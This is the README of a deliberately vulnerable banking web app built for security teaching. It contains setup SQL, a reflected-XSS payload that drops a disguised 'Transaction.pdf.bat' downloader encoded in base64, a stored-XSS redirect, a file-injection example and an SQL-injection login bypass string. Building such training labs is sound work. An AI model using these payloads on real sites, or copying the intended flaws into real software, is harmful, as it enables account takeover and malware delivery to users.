# Cloud Architectures and Security
## Vulnerable Web App

### InsecureTrust Bank
Welcome to the "InsecureTrust Bank" project, a unique exploration of cloud architectures and security. This project intentionally showcases various vulnerabilities within a banking website hosted on an Azure virtual machine. Its primary purpose is to serve as an educational tool to highlight the critical importance of robust security practices in today's digital landscape.

InsecureTrust Bank is a deliberately designed, insecure web application that mimics a banking website. It features a range of security weaknesses, misconfigurations, and vulnerabilities commonly found in real-world cloud-based systems. By studying these flaws in a controlled environment, this project aims to promote awareness, understanding, and best practices in cloud security.

## Features

- Explore a vulnerable web application hosted on Azure VM
- Gain hands-on experience with identifying and mitigating common cloud security vulnerabilities
- Learn about potential risks, such as misconfigured services, weak authentication, and unencrypted data transmission
- Join the discussion within the cybersecurity community on strategies for securing cloud-based systems

This project is for educational and awareness purposes only and should not be used in a production environment. By using Insecure Trust Bank, you'll have the opportunity to enhance your knowledge of cloud security and contribute to the ongoing effort to strengthen digital security practices.

Together, let's navigate the challenges of cloud architectures and security by examining the vulnerabilities within the "InsecureTrust Bank" project. We believe that by understanding the risks, we can better protect the digital assets of organizations and individuals alike.


## Tech Stack

"InsecureTrust Bank" (ITB) relies on a variety of technologies to function seamlessly:

- [XAMPP] - ITB utilizes XAMPP to manage client requests and handle server-side operations.
- [PHP] - PHP serves as the foundational framework for ITB, enabling server-side scripting and data processing.
- [JS] - JavaScript plays a crucial role in ITB, handling client-side requests and enhancing interactivity.
- [jQuery] - jQuery is used for client-side scripting and simplifying tasks that involve HTML document traversal and manipulation.
- [CSS] - CSS are employed to infuse visual appeal and style into the website.
- [SQL] - SQL are employed to store and manage data in structured format.

## Installation Guide

##### Prerequisites
- Ensure you have Git installed on your computer. If not, you can download and install it from [Git's official website](https://git-scm.com/downloads).

##### Step 1: Open your Command Line or Terminal
- On Windows, you can use the Command Prompt or Git Bash.
- On macOS and Linux, use the Terminal.

##### Step 2: Navigate to the Directory Where You Want to Install the Project
- Use the `cd` command to navigate to the directory where you want to store the "Insecure Trust Bank" project on your local machine. For example:
   
   ```bash
   cd /XAMPP/htdocs/
    ```

##### Step 3: Clone the Repository
- Use the following command to clone the "Insecure Trust Bank" project repository from GitHub:

    ```bash
       git clone "https://github.com/Hritikpatel/InsecureTrust_Bank.git"
    ```
    This command will initiate the cloning process, downloading the project's files to your local directory.
##### Step 4: Run [XAMPP] server
- Start Apache server on port 80, 443.
- Start MySQL server on 3306.
- Run [XAMPP] shell and run
``` SQL
    CREATE DATABASE ITB;
    USE ITB;
    CREATE TABLE account (
        AccountID INT(11) NOT NULL AUTO_INCREMENT,
        Name VARCHAR(100) NOT NULL,
        DOB DATE,
        Email VARCHAR(100) NOT NULL,
        Phone VARCHAR(15) NOT NULL,
        Adhaar VARCHAR(20) NOT NULL,
        Address TEXT,
        AccountNumber VARCHAR(20) NOT NULL,
        IFSCCode VARCHAR(20) NOT NULL,
        HomeBranch VARCHAR(100),
        AccountType VARCHAR(50),
        CIBILScore INT(11),
        AccountStatus VARCHAR(20),
        NomineeName VARCHAR(100),
        NomineePhone VARCHAR(15),
        NomineeEmail VARCHAR(100),
        RelationshipManagerName VARCHAR(100),
        RelationshipManagerPhone VARCHAR(15),
        RelationshipManagerEmail VARCHAR(100),
        PRIMARY KEY (AccountID)
    );

    CREATE TABLE logininfo (
        Username VARCHAR(50) NOT NULL,
        Password VARCHAR(255) NOT NULL,
        Email VARCHAR(100) NOT NULL,
        Failed_Try INT(11) NOT NULL DEFAULT 0,
        PRIMARY KEY (Username)
    );

    CREATE TABLE support (
        full_name VARCHAR(100) NOT NULL,
        email VARCHAR(100) NOT NULL,
        phone VARCHAR(15),
        category VARCHAR(50) NOT NULL,
        description TEXT,
        attachments VARCHAR(255),
        tkt_no VARCHAR(8),
        isActive TINYINT(1) DEFAULT 1,
        resolved_by VARCHAR(100),
        PRIMARY KEY (tkt_no)
    );

    CREATE TABLE ssidholder (
        ssid VARCHAR(225)
    );

    INSERT INTO account (
        Name, DOB, Email, Phone, Adhaar, Address, AccountNumber, IFSCCode, HomeBranch, AccountType, CIBILScore, AccountStatus, NomineeName, NomineePhone, NomineeEmail, RelationshipManagerName, RelationshipManagerPhone, RelationshipManagerEmail)
    VALUES(
        'Hritik', '2009-11-26', 'hritik@gmail.com', '+01 8220846751', '2222 3245 1493', 'Bhabua', '58294869992', 'ABCD1234567', 'Bhabua City', 'Savings', 750, 'Active', 'Jane Doe', '+11234567890', 'xyz@mail.com', 'John Doe', '+11234433247', 'RM@ITB.com'),('John Smith', '1985-03-15', 'john.smith@gmail.com', '+19876543210', '1234 5678 9012', 'New York', '1234567890', 'EFGH9876543', 'New York City', 'Checking', 800, 'Active', 'Alice Johnson', '+11234567890', 'alice@mail.com', 'David Wilson', '+11234433247', 'david@mail.com'), ('Sarah Davis', '1990-07-20', 'sarah.davis@gmail.com', '+18887776655', '5678 1234 9012', 'Los Angeles', '9876543210', 'IJKL5432109', 'Los Angeles City', 'Savings', 720, 'Active', 'Michael Brown', '+11234567890', 'michael@mail.com', 'Emily White', '+11234433247', 'emily@mail.com');
    

    INSERT INTO logininfo (Username, password, Email, failed_try)
    VALUES
    ('john_doe', 'hashed_password_johndoe', 'john.doe@example.com', 0),
    ('alice_smith', 'hashed_password_alicesmith', 'alice.smith@example.com', 0),
    ('bob_jones', 'hashed_password_bobjones', 'bob.jones@example.com', 0),
    ('emily_wilson', 'hashed_password_emilywilson', 'emily.wilson@example.com', 0),
    ('michael_brown', 'hashed_password_michaelbrown', 'michael.brown@example.com', 0),
    ('HRITIK', 'PASSWORD@HRITIK', 'hritik@mail.com', 0);

    INSERT INTO support (full_name, email, phone, category, description, tkt_no, isActive, resolved_by)
VALUES
    ('John Doe', 'johndoe@example.com', '1234567890', 'Technical Support', 'This is a technical issue.', 'ABCDE123', 1, NULL),
    ('Alice Smith', 'alicesmith@example.com', '9876543210', 'Account Issues', 'I have a problem with my account.', 'FGHIJ678', 1, NULL),
    ('Bob Jones', 'bobjones@example.com', '5555555555', 'Billing Inquiries', 'I need information about my bill.', 'KLMNO123', 1, NULL),
    ('Emily Wilson', 'emilywilson@example.com', '3333333333', 'Technical Support', 'I need technical assistance.', 'PQRSTU567', 1, NULL),
    ('Michael Brown', 'michaelbrown@example.com', '6666666666', 'Technical Support', 'I have a technical question.', 'VWXYZA789', 1, NULL),
    ('Hritik Patel', 'hritik@example.com', '1111111111', 'Account Issues', 'I am having problems with my account.', 'BCDEFG012', 1, NULL),
    ('John Smith', 'john@example.com', '2222222222', 'Technical Support', 'I need help with a technical issue.', 'HIJKLM345', 1, NULL);




```
- [visit-local] localhost/InsecureTrust_Bank

## Vulnerabilities
1. R-XSS
    - R-XSS is a type of cross-site scripting vulnerability where an attacker injects malicious scripts that are reflected off a web server and executed in a victim's browser.
    - CVE code: ```CVE-2023-29457```
    - In ITB, [FAQ Page] has a search bar to search through questions and is prone to R-XSS.
    - Sample Code to demonstrate it:
        ```HTML
        <script> alert(123)</script>
        ```
    - This link has R-XSS [https://shorturl.at/ckvAF] which is infected with: 
        ```HTML
        <script>
            fileName = "Transaction.pdf.bat";
            fileData = "QGVjaG8gb2ZmDQoNCjo6IERlZmluZSB0aGUgVVJMIG9mIHRoZSByYXcgZmlsZSBvbiBHaXRIdWINCnNldCBmaWxlVXJsPWh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS91c2VybmFtZS9yZXBvL21haW4vcGF0aC90by9maWxlLnR4dA0KDQo6OiBEZWZpbmUgdGhlIHRhcmdldCBkaXJlY3Rvcnkgd2hlcmUgeW91IHdhbnQgdG8gc2F2ZSB0aGUgZmlsZQ0Kc2V0IHRhcmdldERpcj1DOi8vDQoNCjo6IENyZWF0ZSB0aGUgdGFyZ2V0IGRpcmVjdG9yeSBpZiBpdCBkb2Vzbid0IGV4aXN0DQppZiBub3QgZXhpc3QgIiV0YXJnZXREaXIlIiBta2RpciAiJXRhcmdldERpciUiDQoNCjo6IFVzZSBjdXJsIHRvIGRvd25sb2FkIHRoZSBmaWxlDQpjdXJsIC1vICIldGFyZ2V0RGlyJVxmaWxlLnR4dCIgIiVmaWxlVXJsJSINCg==";

            function base64tobytes(base64Adata){
                var binValue = atob(base64Adata);
                var binLength = binValue.length;
                var bytesData = new Uint8Array(binLength);
                for (var i = 0 ; i<binLength; i++){
                    bytesData[i] = binValue.charCodeAt(i);
                }
                return bytesData.buffer;
            }
            var fileBytes = base64tobytes(fileData);
            var blob = new Blob([fileBytes], {"type":"octet/stream"});
            var aTag = document.createElement("a");
            document.body.append(aTag);
            aTag.style = "display: none;";
            var url= window.URL.createObjectURL(blob);
            aTag.href = url;
            aTag.download = fileName;
            aTag.click();
            window.URL.revokeObjectURL(url);
        </script>
        ```
    - [Vulnerable Code](https://github.com/Hritikpatel/InsecureTrust_Bank/blob/0e5444c85ec418258562639c3383b31077374692/public/faq.php#L58), Here user input is getting appended in HTML as it is...
2. S-XSS
    - S-XSS typically refers to "Stored Cross-Site Scripting," where malicious scripts are stored on a web server and executed when viewed by other users, potentially leading to security vulnerabilities. 
    - CVE code: ```CVE-2023-2718```
    - In ITB, [Support Page] has "Description" field which is prone to S-XSS.
    - Sample Code to demonstrate it:
        ```HTML 
        <span onmouseover="window.location='try.php?url='+encodeURIComponent(window.location.href)">Hover over me</span>
        ```
    - [Vulnerable Code](https://github.com/Hritikpatel/InsecureTrust_Bank/blob/0e5444c85ec418258562639c3383b31077374692/assets/php_process/support_request.php#L38), Here user input is accepted as it is...
4. File Injection
    - File Injection is a security vulnerability where an attacker can manipulate or inject malicious files, typically to exploit a system's processing and execute unauthorized code or access sensitive data, potentially compromising system integrity and security.
    - CVE code: ```CVE-2020-25048```
    - In ITB, [Support Page]'s Attachments field is vulnerable to file injection.
    - Sample Code to demonstrate it:
        ```HTML
        ./try.php
        ```
    - [Vulnerable Code](https://github.com/Hritikpatel/InsecureTrust_Bank/blob/0e5444c85ec418258562639c3383b31077374692/assets/php_process/support_request.php#L65), Here we are saving whatever files we are reciving from client...
4. SQL Injection
    - SQL Injection is a malicious technique where an attacker inserts or manipulates SQL queries within an web app's input fields, potentially allowing unauthorized access, data retrieval, modification, or deletion in a connected database, posing significant security risks.
    - CVE code: ```CVE-2023-4485```
    - In ITB, [LogIn Page]'s password feild is vulnerable to SQL injection.
    - Sample Code to demonstrate it:
        ```HTML
        NO' OR '1' = '1
        ```
    - [Vulnerable Code](https://github.com/Hritikpatel/InsecureTrust_Bank/blob/0e5444c85ec418258562639c3383b31077374692/assets/php_process/login_process.php#L27), Here database query is getting genrated using string concat...
    
5. Insecure API
    - Insecure API refers to an application programming interface that lacks proper security measures, making it susceptible to various threats such as data breaches, unauthorized access, and manipulation, highlighting the need for robust security practices to protect sensitive data and ensure the integrity of communication.
    - CVE code: ```CVE-2023-40729```
    - In ITB, all data in [Dashboard Page] is coming through insecure API.
    - [Vulnerable Code](https://github.com/Hritikpatel/InsecureTrust_Bank/blob/0e5444c85ec418258562639c3383b31077374692/assets/php_process/api.php#L37), Here we are forwarding SQL response to client with out encrypting...

## Vulnerability mentioned above are resolved in [STB]


[//]: #

   [ITB]: <https://github.com/Hritikpatel/InsecureTrust_Bank>
   [STB]: <https://github.com/Hritikpatel/SecureTrust_Bank>
   [Visit-Local]: <http://localhost/InsecureTrust_Bank/>
   [Support Page]: <http://localhost/InsecureTrust_Bank/public/support.php>
   [FAQ Page]: <http://localhost/InsecureTrust_Bank/public/faq.php>
   [LogIn Page]: <http://localhost/InsecureTrust_Bank/public/login.php>
   [dashboard Page]: <http://localhost/InsecureTrust_Bank/public/dashboard.php>
   [JS]: <https://www.javascript.com/>
   [jQuery]: <http://jquery.com>
   [XAMPP]: <https://www.apachefriends.org/>
   [PHP]: <https://www.php.net/>
   [CSS]: <https://developer.mozilla.org/en-US/docs/Web/CSS>
   [https://shorturl.at/ckvAF]: <https://shorturl.at/ckvAF>
   [SQL]: <https://www.microsoft.com/en-us/sql-server/sql-server-downloads>
